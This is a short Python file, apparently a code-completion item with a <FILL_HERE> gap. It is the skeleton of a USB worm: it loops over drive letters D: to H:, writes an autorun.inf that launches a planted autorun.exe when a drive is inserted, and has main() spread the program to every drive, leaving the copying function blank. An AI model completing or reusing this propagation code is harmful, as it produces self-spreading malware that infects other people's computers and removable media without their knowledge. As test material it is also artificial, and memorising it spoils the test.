import os
import shutil
import random
import string
from pathlib import Path

# List of predefined drive names to check
DRIVE_NAMES = ['D:', 'E:', 'F:', 'G:', 'H:']

def generate_random_filename(length=10):
    """Generate a random filename of specified length."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def create_autorun_file(drive_path):
    """Create an autorun.inf file to automatically run the program on drive insertion."""
    autorun_content = f"""
    [AutoRun]
    open={os.path.join(drive_path, 'autorun.exe')}
    action=Run {os.path.join(drive_path, 'autorun.exe')}
    """
    autorun_path = os.path.join(drive_path, 'autorun.inf')
    with open(autorun_path, 'w') as f:
        f.write(autorun_content)

def propagate_to_drive(drive_name):
    <FILL_HERE>
def main():
    """Main function to propagate the program to all predefined drives."""
    for drive in DRIVE_NAMES:
        propagate_to_drive(drive)

if __name__ == "__main__":
    main()